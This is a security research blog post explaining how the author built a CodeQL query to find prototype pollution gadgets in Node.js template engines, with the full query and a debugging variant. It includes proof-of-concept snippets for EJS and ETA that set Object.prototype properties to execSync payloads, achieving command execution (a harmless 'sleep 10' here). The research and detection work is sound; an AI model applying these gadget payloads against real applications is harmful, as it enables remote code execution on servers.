@@ -1,0 +1,746 @@
+<!DOCTYPE html><html lang="en"><head>
+    
+      <title>
+        Finding Prototype Pollution gadgets with CodeQL ::
+        jorgectf — blog
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta name="description" content="Finding Prototype Pollution gadgets with CodeQL."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://jorgectf.github.io/blog/post/finding-prototype-pollution-gadgets-with-codeql/"/>
+
+
+
+
+
+<link rel="stylesheet" href="https://jorgectf.github.io/blog/assets/style.css"/>
+
+<link rel="stylesheet" href="https://jorgectf.github.io/blog/style.css"/>
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://jorgectf.github.io/blog/img/apple-touch-icon-144-precomposed.png"/>
+<link rel="shortcut icon" href="https://jorgectf.github.io/blog/img/favicon.png"/>
+
+
+<link href="https://jorgectf.github.io/blog/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.github.io/blog/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.github.io/blog/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.github.io/blog/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.github.io/blog/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.github.io/blog/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Finding Prototype Pollution gadgets with CodeQL"/>
+<meta name="twitter:description" content="Finding Prototype Pollution gadgets with CodeQL."/>
+
+
+
+<meta property="og:title" content="Finding Prototype Pollution gadgets with CodeQL"/>
+<meta property="og:description" content="Finding Prototype Pollution gadgets with CodeQL."/>
+<meta property="og:type" content="article"/>
+<meta property="og:url" content="https://jorgectf.github.io/blog/post/finding-prototype-pollution-gadgets-with-codeql/"/><meta property="article:section" content="post"/>
+<meta property="article:published_time" content="2022-01-04T11:00:00+00:00"/>
+<meta property="article:modified_time" content="2022-01-04T11:00:00+00:00"/><meta property="og:site_name" content="jorgectf"/>
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="https://jorgectf.github.io/blog/" class="logo" style="text-decoration: none;">
+  
+  <img src="https://jorgectf.github.io/blog/logo.png" alt="jorgectf"/>
+  
+</a>
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+    
+    
+    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
+    
+    
+    
+    <li><a href="https://jorgectf.github.io/blog/research/">Research</a></li>
+    
+    
+    <li><a href="../">About</a></li>
+    
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+    
+    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
+    
+    
+    
+    <li><a href="https://jorgectf.github.io/blog/research/">Research</a></li>
+    
+    
+    <li><a href="../">About</a></li>
+  </ul>
+</nav>
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"></path>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">Finding Prototype Pollution gadgets with CodeQL</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2022-01-04
+        </span>
+
+        
+          
+        
+      
+
+      
+
+
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="https://jorgectf.github.io/blog/tags/prototype-pollution/">#Prototype Pollution</a> 
+        
+          <a href="https://jorgectf.github.io/blog/tags/nodejs/">#NodeJS</a> 
+        
+          <a href="https://jorgectf.github.io/blog/tags/javascript/">#JavaScript</a> 
+        
+          <a href="https://jorgectf.github.io/blog/tags/codeql/">#CodeQL</a> 
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+      <h1 id="tldr">TL;DR</h1>
+<p>Following latest’s <a href="https://jorgectf.github.io/blog/post/practical-codeql-introduction/" target="_blank">CodeQL introduction</a> post and inspired by <a href="https://twitter.com/sonarsource/status/1471148042577350659" target="_blank">a challenge</a> from SonarSource’s #codeadvent2021 and SecurityMB’s October 2021 <a href="https://www.creastery.com/blog/securitymb-october-2021-prototype-pollution-challenge/" target="_blank">challenge</a>, I thought it would be fun to write a CodeQL query to find prototype pollution gadgets.</p>
+<p>I made a <a href="https://twitter.com/jorge_ctf/status/1471777193890095108" target="_blank">quick and dirty approach</a> (to be fair, it was my first time using CodeQL for javascript), that already found <a href="https://twitter.com/jorge_ctf/status/1471778489057611780" target="_blank">interesting results</a>, that I’d eventually improve, so keep reading if you want to see the entire process along with some interesting results!</p>
+<h1 id="prototype-pollution">Prototype Pollution</h1>
+<center>
+<img src="https://jorgectf.github.io/blog/static/proto-poll-gadgets/meme1.jpg"/>
+</center>
+<p>The objective of this post is not to explain what prototype pollution vulnerability is, but overall, being able to edit an object’s prototype or <code>Object</code>’s prototype (through their properties) let an attacker pollute it and likely maliciously change affected code’s objective.</p>
+<h2 id="gadgets">Gadgets</h2>
+<p>We may understand [insert vulnerability here] gadgets as code snippets or behaviours that help a vulnerability to happen. In this case, a prototype pollution gadget is an object’s property read <em>which is not defined</em> flowing to a JS-executing function (such as <code>eval</code> or <code>Function</code>).</p>
+<ul>
+<li>The gadget needs not to be defined, as object’s property reads uses object’s prototype property reads as a fallback.</li>
+</ul>
+<h1 id="codeql-query-development">CodeQL query development</h1>
+<p>You may find the final query at <a href="#final-query">#final-query</a>.</p>
+<p>The first approach looked like the following snippet:</p>
+<pre tabindex="0"><code class="language-codeql" data-lang="codeql">/**
+ * @kind path-problem
+ */
+
+import javascript
+import semmle.javascript.security.dataflow.CodeInjectionCustomizations::CodeInjection
+import DataFlow::PathGraph
+
+class BadIfPollutedConfig extends TaintTracking::Configuration {
+  BadIfPollutedConfig() { this = &#34;BadIfPollutedConfig&#34; }
+
+  // Any {} that does not set a custom __proto__
+  override predicate isSource(DataFlow::Node source) {
+    exists(DataFlow::ObjectLiteralNode object |
+      not object.toString().matches(&#34;%\\_\\_proto\\_\\_%&#34;) and
+      source = object
+    )
+  }
+
+  // An expression which may be evaluated as JavaScript
+  override predicate isSink(DataFlow::Node sink) { sink instanceof EvalJavaScriptSink }
+
+  // Make a valid step: variable = {} -&gt; Object.create(variable)
+  override predicate isAdditionalTaintStep(DataFlow::Node nodeFrom, DataFlow::Node nodeTo) {
+    exists(DataFlow::SourceNode c, DataFlow::CallNode call |
+      c.toString() = &#34;Object.create&#34; and
+      call = c.getACall() and
+      nodeFrom = call.getArgument(0) and
+      nodeTo = call
+    )
+  }
+}
+
+from BadIfPollutedConfig cfg, DataFlow::PathNode source, DataFlow::PathNode sink
+where cfg.hasFlowPath(source, sink)
+select sink.getNode(), source, sink, &#34;$@ flows to $@&#34;, source.getNode(), &#34;Empty dict&#34;,
+  sink.getNode(), &#34;this eval-alike call.&#34;
+</code></pre><p>However, almost everything is likely improvable.</p>
+<h2 id="source">Source</h2>
+<pre tabindex="0"><code class="language-codeql" data-lang="codeql">override predicate isSource(DataFlow::Node source) {
+    exists(DataFlow::ObjectLiteralNode object |
+        not object.toString().matches(&#34;%\\_\\_proto\\_\\_%&#34;) and
+        source = object
+    )
+}
+</code></pre><p>Some of you may have wanted to erase me from the universe for using <code>toString()</code> to check a property access, but that’s the only thing I thought about before digging into CodeQL for JavaScript’s juice.</p>
+<p>Playing with objects&#39; properties:</p>
+<ul>
+<li><code>a = {}</code>: <code>ObjectLiteralNode</code> declaration.</li>
+<li><code>a.foo = &#34;bar&#34;</code>: <code>PropWrite</code></li>
+<li>
+<ul>
+<li><code>getBase()</code> is a use of the first point (then <code>getBase().getALocalSource()</code> is what we will be using to correlate both nodes).</li>
+</ul>
+</li>
+<li>
+<ul>
+<li><code>getPropertyName()</code> returns <code>foo</code>.</li>
+</ul>
+</li>
+<li>
+<ul>
+<li><code>getRhs()</code> returns <code>&#34;bar&#34;</code>.</li>
+</ul>
+</li>
+<li><code>eval(a.foo)</code>: <code>eval</code>’s first argument is a <code>PropRead</code> with the same <code>getBase()</code> and <code>getPropertyName()</code> predicates.</li>
+</ul>
+<pre tabindex="0"><code class="language-codeql" data-lang="codeql">class BadIfPollutedSource extends DataFlow::ObjectLiteralNode {
+  BadIfPollutedSource() {
+    not exists(DataFlow::PropWrite propWrite |
+      // ObjectLiteralNode.__proto__ and ObjectLiteralNode.constructor
+      exists( |
+        propWrite.getPropertyName() = [&#34;__proto__&#34;, &#34;constructor&#34;] and
+        propWrite.getBase().getALocalSource() = this
+      )
+      or
+      // ObjectLiteralNode.constructor.prototype
+      exists(DataFlow::PropRead constRead |
+        constRead.getPropertyName() = &#34;constructor&#34; and
+        constRead.getBase().getALocalSource() = this and
+        propWrite.getPropertyName() = &#34;prototype&#34; and
+        propWrite.getBase().getALocalSource() = constRead
+      ) and
+      propWrite.getRhs().asExpr() instanceof NullLiteral
+    )
+  }
+}
+</code></pre><h2 id="sink">Sink</h2>
+<pre tabindex="0"><code class="language-codeql" data-lang="codeql">override predicate isSink(DataFlow::Node sink) {
+    sink instanceof EvalJavaScriptSink 
+}
+</code></pre><p>Sink’s evolution just focus on getting proper results like <code>tainted</code> in <code>tainted + foo</code> when it is the last step of a flow.</p>
+<pre tabindex="0"><code class="language-codeql" data-lang="codeql">class CustomEvalJavaScriptSink extends DataFlow::ValueNode {
+  DataFlow::ValueNode t;
+  DataFlow::InvokeNode c;
+
+  CustomEvalJavaScriptSink() {
+    t instanceof EvalJavaScriptSink and
+    c.getAnArgument() = t and
+    (
+      if exists(t.asExpr().(AddExpr))
+      then this.asExpr() = t.asExpr().(AddExpr).getAnOperand()
+      else this = t
+    )
+  }
+
+  DataFlow::InvokeNode getCall() { result = c }
+}
+</code></pre><p>Furthermore, wrapping <code>EvalJavaScriptSink</code> in a variable let us get the call whose argument is that variable in order to make a <code>getCall()</code> predicate used in the select clause of the query.</p>
+<h2 id="additional-taint-step">Additional taint step</h2>
+<pre tabindex="0"><code class="language-codeql" data-lang="codeql">override predicate isAdditionalTaintStep(DataFlow::Node nodeFrom, DataFlow::Node nodeTo) {
+    exists(DataFlow::SourceNode c, DataFlow::CallNode call |
+        c.toString() = &#34;Object.create&#34; and
+        call = c.getACall() and
+        nodeFrom = call.getArgument(0) and
+        nodeTo = call
+    )
+}
+</code></pre><p>This taint step lets CodeQL know that there may be flow like an <code>ObjectLiteralNode</code> flowing to the first argument of <code>Object.create</code>, whose result is also a valid gadget.</p>
+<h2 id="sanitizer">Sanitizer</h2>
+<pre tabindex="0"><code class="language-codeql" data-lang="codeql">override predicate isSanitizer(DataFlow::Node sanitizer) {
+    exists(LogOrExpr orExpr, Expr leftSource |
+        leftSource = orExpr.getLeftOperand().flow().getALocalSource().asExpr() and
+        not leftSource = orExpr.getLeftOperand() and
+        not leftSource instanceof NullLiteral and
+        not orExpr.getLeftOperand().mayHaveBooleanValue(false) and
+        sanitizer.asExpr() = orExpr.getRightOperand()
+    )
+}
+</code></pre><p>We want to stop tracking flow when a <code>LogOrExpr</code> (<code>foo || bar</code>) holds an <code>ObjectLiteralNode</code> in the right side of the expression and a <strong>valid</strong> variable in the first operand.</p>
+<h3 id="debugging">Debugging</h3>
+<p>Let’s make query development easier and more fun by:</p>
+<ul>
+<li>Using <code>Backward DataFlow</code>: Set <code>isSource()</code> as <code>any()</code>, so we will be getting every single thing floing to our specific sink.</li>
+<li>Using <code>Forward DataFlow</code>: Set <code>isSink()</code> as <code>any()</code>, so we will be getting flow from our specific source to any node.</li>
+<li>Setting custom node files in order to restrict result locations.</li>
+<li>Using a custom <code>PathNode</code> implementation to get the QL class used in each step of the flow path.</li>
+</ul>
+<p>See <a href="#debugging-query">#debugging-query</a>.</p>
+<h1 id="query-hits">Query hits</h1>
+<p>In order to test the query, I ran it against all sources listed in <a href="https://expressjs.com/en/resources/template-engines.html" target="_blank">Template engines for NodeJS</a>.</p>
+<p><a href="https://lgtm.com/query/3007557212791589081/" target="_blank">LGTM Results</a></p>
+<p>Some snippets to test locally:</p>
+<ul>
+<li><a href="https://twitter.com/jorge_ctf/status/1471778489057611780" target="_blank">Outdated EJS</a> (version provided by NPM though)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#75715e">// edited from https://twitter.com/sonarsource/status/1471148042577350659
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
+
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#39;view engine&#39;</span>, <span style="color:#e6db74">&#39;ejs&#39;</span>);
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#39;views&#39;</span>, <span style="color:#a6e22e">__dirname</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/views&#39;</span>);
+
+<span style="color:#a6e22e">cmd</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;sleep 10&#34;</span>;
+
+Object.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">outputFunctionName</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`a;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">cmd</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;);//`</span>;
+Object.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">client</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;notEmpty&#34;</span>; Object.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">escapeFunction</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;`${process.mainModule.require(\&#39;child_process\&#39;).execSync(\&#39;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">cmd</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\&#39;)}`&#39;</span>;
+Object.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">client</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;notEmpty&#34;</span>; Object.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">escape</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;`${process.mainModule.require(\&#39;child_process\&#39;).execSync(\&#39;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">cmd</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\&#39;)}`&#39;</span>;
+Object.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">localsName</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`a=process.mainModule.require(&#39;child_process&#39;).execSync(&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">cmd</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;)`</span>;
+Object.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">destructuredLocals</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;/*&#34;</span>, <span style="color:#e6db74">`*/a=process.mainModule.require(&#39;child_process&#39;).execSync(&#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">cmd</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;);//`</span>];
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/ejs&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;template&#39;</span>, {<span style="color:#a6e22e">foo</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;bar&#34;</span>})
+})
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">1337</span>);
+</code></pre></div><ul>
+<li><a href="https://twitter.com/jorge_ctf/status/1474304978810556447" target="_blank">ETA</a></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#75715e">// edited from https://eta.js.org/docs/examples/express
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;express&#34;</span>)
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>()
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">eta</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;eta&#34;</span>)
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">engine</span>(<span style="color:#e6db74">&#34;eta&#34;</span>, <span style="color:#a6e22e">eta</span>.<span style="color:#a6e22e">renderFile</span>)
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#34;view engine&#34;</span>, <span style="color:#e6db74">&#34;eta&#34;</span>)
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#39;views&#39;</span>, <span style="color:#a6e22e">__dirname</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/views&#39;</span>);
+
+<span style="color:#a6e22e">cmd</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;sleep 10&#34;</span>;
+
+Object.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">useWith</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1&#34;</span>; Object.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">varName</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a=process.mainModule.require(&#34;child_process&#34;).execSync(&#34;&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">cmd</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&#34;)&#39;</span>;
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/eta&#34;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
+    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#34;template&#34;</span>, {<span style="color:#a6e22e">foo</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;bar&#34;</span>})
+})
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">1337</span>)
+</code></pre></div><h2 id="final-query">Final query</h2>
+<pre tabindex="0"><code class="language-codeql" data-lang="codeql">/**
+ * @kind path-problem
+ */
+
+import javascript
+import semmle.javascript.security.dataflow.CodeInjectionCustomizations::CodeInjection
+import DataFlow::PathGraph
+
+/**
+ * A custom `EvalJavaScriptSink` wrapper.
+ *
+ * * `t` holds `EvalJavaScriptSink`.
+ * * `c` holds the call holding `t`.
+ *
+ * There&#39;s an additional taint step specified in order to catch
+ * `tainted` in sinks like `tainted + foo`; since the sink is
+ * the entire argument, this way the results are more accurate.
+ */
+class CustomEvalJavaScriptSink extends DataFlow::ValueNode {
+  DataFlow::ValueNode t;
+  DataFlow::InvokeNode c;
+
+  CustomEvalJavaScriptSink() {
+    t instanceof EvalJavaScriptSink and
+    c.getAnArgument() = t and
+    (
+      if exists(t.asExpr().(AddExpr))
+      then this.asExpr() = t.asExpr().(AddExpr).getAnOperand()
+      else this = t
+    )
+  }
+
+  DataFlow::InvokeNode getCall() { result = c }
+}
+
+/**
+ * An `ObjectLiteralNode` not overriding its `__proto__`, `constructor` and
+ * `constructor.prototype` properties.
+ *
+ * It is not set as sanitizer since flow between two same source-sink AST nodes
+ * may differ (i.e., one path in source-sink flow may not pass through this
+ * property writes)
+ */
+class BadIfPollutedSource extends DataFlow::ObjectLiteralNode {
+  BadIfPollutedSource() {
+    not exists(DataFlow::PropWrite propWrite |
+      // ObjectLiteralNode.__proto__ and ObjectLiteralNode.constructor
+      exists( |
+        propWrite.getPropertyName() = [&#34;__proto__&#34;, &#34;constructor&#34;] and
+        propWrite.getBase().getALocalSource() = this
+      )
+      or
+      // ObjectLiteralNode.constructor.prototype
+      exists(DataFlow::PropRead constRead |
+        constRead.getPropertyName() = &#34;constructor&#34; and
+        constRead.getBase().getALocalSource() = this and
+        propWrite.getPropertyName() = &#34;prototype&#34; and
+        propWrite.getBase().getALocalSource() = constRead
+      ) and
+      propWrite.getRhs().asExpr() instanceof NullLiteral
+    )
+  }
+}
+
+class BadIfPollutedConfig extends TaintTracking::Configuration {
+  BadIfPollutedConfig() { this = &#34;BadIfPollutedConfig&#34; }
+
+  /**
+   * An `ObjectLiteralNode` that does not set a custom prototype
+   * on its declaration or flow.
+   *
+   * See `BadIfPollutedSource`.
+   */
+  override predicate isSource(DataFlow::Node source) { source instanceof BadIfPollutedSource }
+
+  /**
+   * An expression which may be evaluated as JavaScript.
+   *
+   * See `CustomEvalJavaScriptSink`.
+   */
+  override predicate isSink(DataFlow::Node sink) { sink instanceof CustomEvalJavaScriptSink }
+
+  /**
+   * Make a valid taint step: `a = {} -&gt; Object.create(a)`.
+   */
+  override predicate isAdditionalTaintStep(DataFlow::Node nodeFrom, DataFlow::Node nodeTo) {
+    exists(DataFlow::InvokeNode objectCreate |
+      objectCreate = DataFlow::globalVarRef(&#34;Object&#34;).getAMemberCall(&#34;create&#34;) and
+      nodeFrom = objectCreate.getArgument(0) and
+      nodeTo = objectCreate
+    )
+  }
+
+  /**
+   * `foo || BadIfPollutedSource` -&gt; `foo` holds a non (not defined|null|false) value
+   *  and so it will be assigned instead of `BadIfPollutedSource`.
+   *
+   * FP issue: `foo` may be declared out of taint tracking&#39;s scope.
+   *
+   * `leftSource = orExpr.getLeftOperand()`: when a node&#39;s local source is itself
+   * means the node might not be defined in the scope.
+   */
+  override predicate isSanitizer(DataFlow::Node sanitizer) {
+    exists(LogOrExpr orExpr, Expr leftSource |
+      leftSource = orExpr.getLeftOperand().flow().getALocalSource().asExpr() and
+      not leftSource = orExpr.getLeftOperand() and
+      not leftSource instanceof NullLiteral and
+      not orExpr.getLeftOperand().mayHaveBooleanValue(false) and
+      sanitizer.asExpr() = orExpr.getRightOperand()
+    )
+  }
+}
+
+from BadIfPollutedConfig cfg, DataFlow::PathNode source, DataFlow::PathNode sink
+where cfg.hasFlowPath(source, sink)
+select sink.getNode(), source, sink, &#34;$@ flows to $@ as $@&#34;, source.getNode(), &#34;This object&#34;,
+  sink.getNode().(CustomEvalJavaScriptSink).getCall(), &#34;this eval-alike call&#34;, sink.getNode(),
+  sink.toString()
+</code></pre><h2 id="debugging-query">Debugging query</h2>
+<p><code>semmle.javascript.custom.Debug</code>:</p>
+<pre tabindex="0"><code class="language-codeql" data-lang="codeql">private import javascript
+
+module Debug {
+  /**
+   * If `true`, show the QL class for each flow step.
+   */
+  boolean getDebug() { result = false }
+
+  /**
+   * If `true`, apply Backward Dataflow.
+   */
+  boolean getBackward() { result = false }
+
+  /**
+   * If `true`, apply Forward Dataflow.
+   */
+  boolean getForward() { result = false }
+
+  /**
+   * Returns a `File` with a specific basename.
+   */
+  File getFile() {
+    result.getBaseName().matches(&#34;%%&#34;) and not result.getBaseName().matches(&#34;test.js&#34;)
+  }
+}
+
+class CustomPathNode extends DataFlow::PathNode {
+  CustomPathNode() { this = this }
+
+  override string toString() {
+    if Debug::getDebug() = true
+    then result = this.getNode().toString() + &#34;, &#34; + this.getNode().getAQlClass()
+    else result = this.getNode().toString()
+  }
+}
+</code></pre><p><code>BadIfPolluted.ql</code>:</p>
+<pre tabindex="0"><code class="language-codeql" data-lang="codeql">/**
+ * @kind path-problem
+ */
+
+import javascript
+import semmle.javascript.security.dataflow.CodeInjectionCustomizations::CodeInjection
+import DataFlow::PathGraph
+import semmle.javascript.custom.Debug
+
+/**
+ * A custom `EvalJavaScriptSink` wrapper.
+ *
+ * * `t` holds `EvalJavaScriptSink`.
+ * * `c` holds the call holding `t`.
+ *
+ * There&#39;s an additional taint step specified in order to catch
+ * `tainted` in sinks like `tainted + foo`; since the sink is
+ * the entire argument, this way the results are more accurate.
+ */
+class CustomEvalJavaScriptSink extends DataFlow::ValueNode {
+  DataFlow::ValueNode t;
+  DataFlow::InvokeNode c;
+
+  CustomEvalJavaScriptSink() {
+    t instanceof EvalJavaScriptSink and
+    c.getAnArgument() = t and
+    (
+      if exists(t.asExpr().(AddExpr))
+      then this.asExpr() = t.asExpr().(AddExpr).getAnOperand()
+      else this = t
+    )
+  }
+
+  DataFlow::InvokeNode getCall() { result = c }
+}
+
+/**
+ * An `ObjectLiteralNode` not overriding its `__proto__`, `constructor` and
+ * `constructor.prototype` properties.
+ *
+ * It is not set as sanitizer since flow between two same source-sink AST nodes
+ * may differ (i.e., one path in source-sink flow may not pass through this
+ * property writes)
+ */
+class BadIfPollutedSource extends DataFlow::ObjectLiteralNode {
+  BadIfPollutedSource() {
+    not exists(DataFlow::PropWrite propWrite |
+      // ObjectLiteralNode.__proto__ and ObjectLiteralNode.constructor
+      exists( |
+        propWrite.getPropertyName() = [&#34;__proto__&#34;, &#34;constructor&#34;] and
+        propWrite.getBase().getALocalSource() = this
+      )
+      or
+      // ObjectLiteralNode.constructor.prototype
+      exists(DataFlow::PropRead constRead |
+        constRead.getPropertyName() = &#34;constructor&#34; and
+        constRead.getBase().getALocalSource() = this and
+        propWrite.getPropertyName() = &#34;prototype&#34; and
+        propWrite.getBase().getALocalSource() = constRead
+      ) and
+      propWrite.getRhs().asExpr() instanceof NullLiteral
+    )
+  }
+}
+
+class BadIfPollutedConfig extends TaintTracking::Configuration {
+  BadIfPollutedConfig() { this = &#34;BadIfPollutedConfig&#34; }
+
+  /**
+   * An `ObjectLiteralNode` that does not set a custom prototype
+   * on its declaration or flow.
+   *
+   * See `BadIfPollutedSource`.
+   */
+  override predicate isSource(DataFlow::Node source) {
+    (if Debug::getBackward() = true then any() else source instanceof BadIfPollutedSource) and
+    source.getFile() = Debug::getFile()
+  }
+
+  /**
+   * An expression which may be evaluated as JavaScript.
+   *
+   * See `CustomEvalJavaScriptSink`.
+   */
+  override predicate isSink(DataFlow::Node sink) {
+    (if Debug::getForward() = true then any() else sink instanceof CustomEvalJavaScriptSink) and
+    sink.getFile() = Debug::getFile()
+  }
+
+  /**
+   * Make a valid taint step: `a = {} -&gt; Object.create(a)`.
+   */
+  override predicate isAdditionalTaintStep(DataFlow::Node nodeFrom, DataFlow::Node nodeTo) {
+    exists(DataFlow::InvokeNode objectCreate |
+      objectCreate = DataFlow::globalVarRef(&#34;Object&#34;).getAMemberCall(&#34;create&#34;) and
+      nodeFrom = objectCreate.getArgument(0) and
+      nodeTo = objectCreate
+    )
+  }
+
+  /**
+   * `foo || BadIfPollutedSource` -&gt; `foo` holds a non (not defined|null|false) value
+   *  and so it will be assigned instead of `BadIfPollutedSource`.
+   *
+   * FP issue: `foo` may be declared out of taint tracking&#39;s scope.
+   *
+   * `leftSource = orExpr.getLeftOperand()`: when a node&#39;s local source is itself
+   * means the node might not be defined in the scope.
+   */
+  override predicate isSanitizer(DataFlow::Node sanitizer) {
+    exists(LogOrExpr orExpr, Expr leftSource |
+      leftSource = orExpr.getLeftOperand().flow().getALocalSource().asExpr() and
+      not leftSource = orExpr.getLeftOperand() and
+      not leftSource instanceof NullLiteral and
+      not orExpr.getLeftOperand().mayHaveBooleanValue(false) and
+      sanitizer.asExpr() = orExpr.getRightOperand()
+    )
+  }
+}
+
+from BadIfPollutedConfig cfg, CustomPathNode source, CustomPathNode sink
+where cfg.hasFlowPath(source, sink)
+select sink.getNode(), source, sink, &#34;$@ flows to $@ as $@&#34;, source.getNode(), &#34;This object&#34;,
+  sink.getNode().(CustomEvalJavaScriptSink).getCall(), &#34;this eval-alike call&#34;, sink.getNode(),
+  sink.toString()
+</code></pre><h1 id="the-end">The end</h1>
+<p>I hope you found it interesting and had fun reading it.</p>
+<p><a href="https://twitter.com/jorge_ctf" target="_blank">Jorge</a>.</p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
